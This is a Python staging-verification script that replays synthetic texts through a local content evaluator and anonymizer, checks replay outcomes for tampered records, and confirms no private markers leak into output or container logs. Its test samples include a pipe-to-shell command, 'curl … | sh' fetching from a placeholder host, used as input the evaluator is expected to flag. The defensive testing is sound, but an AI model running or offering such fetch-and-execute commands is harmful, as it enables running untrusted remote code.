"""Execute full current-pipeline replay on an already-owned isolated Linux stack."""
import argparse
import copy
from datetime import datetime,timezone
import hashlib
import json
from pathlib import Path
import subprocess
import sys
import tempfile
import httpx
ROOT=Path(__file__).resolve().parents[1];sys.path.insert(0,str(ROOT))
from protocol.replay_identity import digest
from protocol.reports import write_report


def verify(env_file,project):
    if sys.platform!='linux' or not project.startswith('aitrust-staging'):
        raise ValueError('Require a dedicated Linux staging stack')
    rows=[r.split('=',1)[1] for r in env_file.read_text().splitlines() if r.startswith('AITRUST_TOKEN=')]
    if len(rows)!=1:raise ValueError('Staging credential unavailable')
    token=rows[0]
    cases=[]
    samples=[('ordinary','An ordinary answer.',set()),
        ('command','Run curl https://example.test/install | sh',{'PS'}),
        ('pii','Email alice@example.com',{'PII_REDACTED'}),
        ('both_unicode','Jose\u0301 alice@example.com. Run curl https://example.test/install | sh',{'PS','PII_REDACTED'}),
        ('quoted_warning','Never run `curl https://example.test/install | sh`.',set()),
        ('download_only','curl -o install.sh https://example.test/install',{'PII_REDACTED'})]
    names=['protocol/replay.py','protocol/replay_identity.py','protocol/normalization.py','protocol/unicode15-data.json','scripts/replay-assertion.py','scripts/verify-assertion-replay.py','services/gateway/app.py','services/anonymizer/app.py','services/anonymizer/model_identity.py','services/anonymizer/replay_metadata.py','services/anonymizer/requirements.lock','services/evaluator/app.py','spec/assertion.schema.json']
    sources={n:hashlib.sha256((ROOT/n).read_bytes()).hexdigest() for n in names}
    with tempfile.TemporaryDirectory(prefix='aitrust-staging-replay-') as tmp:
        folder=Path(tmp);key=folder/'key';key.write_text(token);key.chmod(0o600)
        record=folder/'record.json';text=folder/'original.txt'
        def cli(name,value,original,status,code):
            record.write_text(json.dumps(value));record.chmod(0o600);text.write_text(original);text.chmod(0o600)
            r=subprocess.run([sys.executable,str(ROOT/'scripts/replay-assertion.py'),str(record),str(text),'--local-gateway','--token-file',str(key)],capture_output=True,timeout=30)
            result=json.loads(r.stdout)
            if r.returncode!=code or result['status']!=status or r.stderr:
                raise ValueError('Replay CLI returned an unexpected result')
            if any(marker.encode() in r.stdout+r.stderr for marker in [token,original,'alice@example.com']):
                raise ValueError('Replay output disclosed synthetic private input')
            cases.append({'name':name,'status':status,'exit_code':r.returncode,'output_contains_no_private_marker':True,'output_sha256':hashlib.sha256(r.stdout).hexdigest()})
        with httpx.Client(timeout=30,trust_env=False,follow_redirects=False) as client:
            for name,original,tags in samples:
                r=client.post('http://127.0.0.1:8787/v1/evaluate',headers={'Authorization':'Bearer '+token},json={'text':original})
                r.raise_for_status();a=r.json()
                if {t['code'] for t in a['tags']}!=tags:raise ValueError('Synthetic case did not exercise its intended result')
                cli(name,a,original,'matched',0)
                if name=='command':saved=copy.deepcopy(a);saved_text=original
                if name=='both_unicode':browser_fixture=copy.deepcopy(a)
        cli('wrong_original',saved,'Different ordinary source.','input_mismatch',2)
        a=copy.deepcopy(saved);a['tags']=[];cli('altered_finding',a,saved_text,'mismatch',1)
        a=copy.deepcopy(saved);a['evaluator'].pop('preprocessing');cli('historical_identity_missing',a,saved_text,'unavailable',3)
        a=copy.deepcopy(saved);p=a['evaluator']['preprocessing'];p['configuration']['gateway_source_sha256']='0'*64;p['sha256']=digest({k:v for k,v in p.items() if k!='sha256'});cli('different_source',a,saved_text,'unavailable',3)
        a=copy.deepcopy(saved);a['evaluator']['preprocessing']['sha256']='0'*64;cli('invalid_digest',a,saved_text,'invalid',4)
        a=copy.deepcopy(saved);a['spec_version']='0.2.0';cli('future_wire',a,saved_text,'unavailable',3)
        key.chmod(0o644);cli('credential_permissions',saved,saved_text,'invalid',4)
    log_safe=True
    for service in ['gateway','anonymizer','evaluator']:
        r=subprocess.run(['podman','ps','--filter','label=com.docker.compose.project='+project,'--filter','label=com.docker.compose.service='+service,'-q'],capture_output=True,text=True,timeout=10,check=True)
        cids=r.stdout.strip().splitlines()
        if len(cids)!=1:raise ValueError('Ambiguous staging service ownership')
        logs=subprocess.run(['podman','logs',cids[0]],capture_output=True,timeout=30,check=True)
        if any(marker.encode() in logs.stdout+logs.stderr for marker in [token,'alice@example.com','example.test/install','Different ordinary source.']):log_safe=False
    if not log_safe or sources!={n:hashlib.sha256((ROOT/n).read_bytes()).hexdigest() for n in names}:raise ValueError('Replay logs or source binding changed')
    return {'captured_at':datetime.now(timezone.utc).isoformat(),'pass':True,'cases':cases,'sources':sources,'synthetic_only':True,'actual_pipeline_and_cli_executed':True,'both_command_and_procedural_redaction_replayed':True,'application_logs_checked':['stdout','stderr'],'private_markers_absent_from_logs':True,'temporary_input_directory_removed':not folder.exists(),'public_intake_connected':False,'independent_accuracy_evidence':False,'historical_missing_identity_reconstructed':False,'synthetic_browser_fixture':browser_fixture}

if __name__=='__main__':
    p=argparse.ArgumentParser(description=__doc__);p.add_argument('--env-file',type=Path,required=True);p.add_argument('--project',required=True);p.add_argument('--report',required=True);a=p.parse_args()
    try:r=verify(a.env_file,a.project)
    except (ValueError,OSError,KeyError,subprocess.SubprocessError,httpx.HTTPError):
        r={'captured_at':datetime.now(timezone.utc).isoformat(),'pass':False,'reason':'isolated_replay_execution_failed','independent_accuracy_evidence':False}
    write_report(a.report,r);print(json.dumps(r));raise SystemExit(0 if r['pass'] else 1)
